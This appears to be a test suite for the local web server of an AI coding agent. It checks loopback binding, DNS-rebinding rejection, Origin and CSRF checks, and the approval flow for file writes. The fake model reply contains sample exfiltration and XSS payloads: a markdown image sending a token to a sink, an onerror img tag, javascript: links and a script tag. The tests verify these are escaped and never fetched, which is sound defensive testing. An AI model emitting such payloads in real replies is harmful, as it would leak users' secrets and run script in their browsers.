import assert from 'node:assert/strict';
import { access, mkdir, realpath } from 'node:fs/promises';
import { request } from 'node:http';
import { join } from 'node:path';
import { after, before, describe, it } from 'node:test';
import { NonceSinks } from '@hn/operations';
import { KeyStore } from '@hn/provider';
import { renderMarkdown, startServe, type Served } from '@hn/surfaces';
import { lastContent, startFakeOpenAI, withTempDir, type FakeOpenAI } from '@hn/testkit';

const exists = (path: string): Promise<boolean> => access(path).then(() => true, () => false);
const toolResults = (req: { messages: readonly { role: string; content?: unknown }[] }): string[] => req.messages.filter((m) => m.role === 'tool').map((m) => String(m.content));

interface Reply {
  readonly status: number;
  readonly headers: Record<string, string | string[] | undefined>;
  readonly body: string;
}

function call(port: number, method: string, path: string, headers: Record<string, string>, body = ''): Promise<Reply> {
  return new Promise((resolve, reject) => {
    const req = request({ host: '127.0.0.1', port, method, path, headers: { host: `127.0.0.1:${port}`, ...headers, 'content-length': String(Buffer.byteLength(body)) } }, (res) => {
      let text = '';
      res.setEncoding('utf8').on('data', (chunk: string) => (text += chunk));
      res.on('end', () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body: text }));
    });
    req.on('error', reject);
    req.end(body);
  });
}

describe('hn serve', () => {
  let model: FakeOpenAI;
  let sinks: NonceSinks;
  let served: Served;
  let top = '';
  let cleanup: () => Promise<void> = async () => undefined;
  before(async () => {
    sinks = await NonceSinks.open();
    model = await startFakeOpenAI((req) => {
      const prompt = lastContent(req, 'user');
      if (prompt.startsWith('WRITE')) return toolResults(req).length === 0 ? { calls: [{ id: 'w', name: 'write_file', args: { path: 'web.txt', content: 'x' } }] } : { text: 'written' };
      return {
        text: `Here you go: ![leak](http://127.0.0.1:${sinks.tcpPort}/secret?d=TOKEN) and <img src="http://127.0.0.1:${sinks.tcpPort}/raw" onerror="alert(1)"> and [docs](https://example.org/a?b=1) and [click](javascript:alert(1)) <script>alert(2)</script>\u001b]8;;http://evil\u0007`,
      };
    });
    await new Promise<void>((resolve) =>
      void withTempDir(async (dir) => {
        top = await realpath(dir);
        await mkdir(join(top, 'project'));
        served = await startServe({ keys: KeyStore.capture({}), cwd: join(top, 'project'), defaults: { model: 'fake', baseUrl: model.url, window: 64_000 }, env: { ...process.env, HN_HOME: join(top, 'home') }, sessionExtras: { verify: 'off' } });
        await new Promise<void>((done) => {
          cleanup = async () => done();
          resolve();
        });
      }),
    );
  });
  after(async () => {
    await served.close();
    await cleanup();
    await model.close();
    await sinks.close();
  });

  const login = async (): Promise<{ cookie: string; csrf: string }> => {
    const origin = `http://127.0.0.1:${served.port}`;
    const reply = await call(served.port, 'POST', '/login', { origin, 'content-type': 'application/x-www-form-urlencoded' }, `token=${served.token}`);
    assert.equal(reply.status, 303);
    const cookie = String(reply.headers['set-cookie']).split(';')[0] as string;
    const session = JSON.parse((await call(served.port, 'GET', '/session', { cookie })).body) as { csrf: string };
    return { cookie, csrf: session.csrf };
  };

  it('attack: serve_rejects_foreign_origin_and_rebinding (loopback only; Host, Origin, cookie and CSRF checked on every request)', async () => {
    const port = served.port;
    const origin = `http://127.0.0.1:${port}`;
    assert.equal(served.server.address() !== null && typeof served.server.address() === 'object' ? (served.server.address() as { address: string }).address : '', '127.0.0.1');
    // DNS rebinding: a page on evil.example whose name now points at 127.0.0.1 sends its own Host.
    assert.equal((await call(port, 'GET', '/', { host: `evil.example:${port}` })).status, 421);
    assert.equal((await call(port, 'GET', '/events', { host: `evil.example:${port}` })).status, 421);
    assert.equal((await call(port, 'POST', '/login', { host: `evil.example:${port}`, origin: `http://evil.example:${port}` }, `token=${served.token}`)).status, 421);
    // Logging in: only the right token, only from this origin; the cookie is HttpOnly and SameSite=Strict.
    assert.equal((await call(port, 'POST', '/login', { origin, 'content-type': 'application/x-www-form-urlencoded' }, 'token=wrong')).status, 401);
    assert.equal((await call(port, 'POST', '/login', { origin: 'http://evil.example', 'content-type': 'application/x-www-form-urlencoded' }, `token=${served.token}`)).status, 403);
    assert.equal((await call(port, 'POST', '/login', { 'content-type': 'application/x-www-form-urlencoded' }, `token=${served.token}`)).status, 403, 'a POST with no Origin');
    const viaUrl = await call(port, 'GET', `/?token=${served.token}`, {});
    assert.equal(viaUrl.status, 303, 'a token in the address must not log anyone in');
    assert.equal(viaUrl.headers['set-cookie'], undefined);
    const { cookie, csrf } = await login();
    const loginReply = await call(port, 'POST', '/login', { origin, 'content-type': 'application/x-www-form-urlencoded' }, `token=${served.token}`);
    assert.match(String(loginReply.headers['set-cookie']), /HttpOnly; SameSite=Strict; Path=\//);
    const json = { 'content-type': 'application/json', cookie };
    // A cross-site page with the cookie riding along: refused by Origin, and by the missing CSRF token.
    assert.equal((await call(port, 'POST', '/prompt', { ...json, origin: 'http://evil.example', 'x-hn-csrf': csrf }, '{"text":"hi"}')).status, 403);
    assert.equal((await call(port, 'POST', '/prompt', { ...json, origin }, '{"text":"hi"}')).status, 403, 'no CSRF token');
    assert.equal((await call(port, 'POST', '/prompt', { ...json, origin, 'x-hn-csrf': 'f'.repeat(64) }, '{"text":"hi"}')).status, 403, 'a wrong CSRF token');
    assert.equal((await call(port, 'POST', '/prompt', { cookie, origin, 'x-hn-csrf': csrf, 'content-type': 'text/plain' }, '{"text":"hi"}')).status, 415, 'a form-style body');
    assert.equal((await call(port, 'POST', '/approve', { ...json, origin, 'x-hn-csrf': csrf, host: `evil.example:${port}` }, '{}')).status, 421);
    assert.equal((await call(port, 'GET', '/session', { cookie, origin: 'http://evil.example' })).status, 403);
    assert.equal((await call(port, 'GET', '/session', {})).status, 401, 'no cookie, no session');
    const upgrade = await call(port, 'GET', '/events', { cookie, connection: 'Upgrade', upgrade: 'websocket', origin: 'http://evil.example', 'sec-websocket-key': 'x', 'sec-websocket-version': '13' }).catch(() => ({ status: 403, headers: {}, body: '' }));
    assert.equal(upgrade.status, 403);
    const page = await call(port, 'GET', '/', { cookie });
    assert.equal(page.status, 200);
    for (const [name, value] of [['x-frame-options', 'DENY'], ['x-content-type-options', 'nosniff'], ['referrer-policy', 'same-origin']] as const) assert.equal(page.headers[name], value);
    assert.match(String(page.headers['content-security-policy']), /default-src 'self'; img-src 'self' data:; connect-src 'self'/);
  });

  it('attack: markdown_image_never_fetched (model images become text, raw HTML is escaped, and nothing is fetched)', async () => {
    const { cookie, csrf } = await login();
    const reply = await call(served.port, 'POST', '/prompt', { cookie, csrf, origin: `http://127.0.0.1:${served.port}`, 'x-hn-csrf': csrf, 'content-type': 'application/json' }, '{"text":"show me"}');
    assert.equal(reply.status, 200);
    const html = (JSON.parse(reply.body) as { html: string }).html;
    // Escaped text may mention onerror; no real tag may carry it, and no link may point at javascript:.
    assert.doesNotMatch(html, /<img|<script|<[^>]*onerror=|href="javascript|\u001b/i);
    assert.match(html, /image not loaded: leak/);
    assert.match(html, /&lt;img src=/);
    assert.match(html, /<a href="https:\/\/example\.org\/a\?b=1" rel="noopener noreferrer nofollow" target="_blank">docs<\/a> <span class="url">\(https:\/\/example\.org\/a\?b=1\)<\/span>/);
    await new Promise((resolve) => setTimeout(resolve, 300));
    assert.deepEqual(sinks.hits, [], 'something fetched the model image');
    assert.doesNotMatch(renderMarkdown('![x](data:image/png;base64,AAAA) <IMG SRC=x> <svg onload=1>'), /<img|<svg/i);
  });

  it('shows a card on the page stream and acts only on an approval sent with the cookie and CSRF token', { timeout: 60_000 }, async () => {
    const { cookie, csrf } = await login();
    const origin = `http://127.0.0.1:${served.port}`;
    const card = new Promise<{ approvalId: string; summary: string }>((resolve) => {
      const req = request({ host: '127.0.0.1', port: served.port, path: '/events', headers: { host: `127.0.0.1:${served.port}`, cookie } }, (res) => {
        let text = '';
        res.setEncoding('utf8').on('data', (chunk: string) => {
          text += chunk;
          const found = /event: card\ndata: (.*)\n/.exec(text);
          if (found !== null) {
            resolve(JSON.parse(found[1] as string) as { approvalId: string; summary: string });
            req.destroy();
          }
        });
      });
      req.end();
    });
    await new Promise((resolve) => setTimeout(resolve, 200));
    const turn = call(served.port, 'POST', '/prompt', { cookie, origin, 'x-hn-csrf': csrf, 'content-type': 'application/json' }, '{"text":"WRITE it"}');
    const shown = await card;
    assert.match(shown.summary, /web\.txt/);
    assert.equal((await call(served.port, 'POST', '/approve', { cookie, origin, 'content-type': 'application/json' }, JSON.stringify({ approvalId: shown.approvalId, decision: 'once' }))).status, 403, 'an approval without the CSRF token');
    assert.equal((await call(served.port, 'POST', '/approve', { cookie, origin, 'x-hn-csrf': csrf, 'content-type': 'application/json' }, JSON.stringify({ approvalId: shown.approvalId, decision: 'once' }))).status, 200);
    assert.equal((await turn).status, 200);
    assert.ok(await exists(join(top, 'project', 'web.txt')));
  });
});
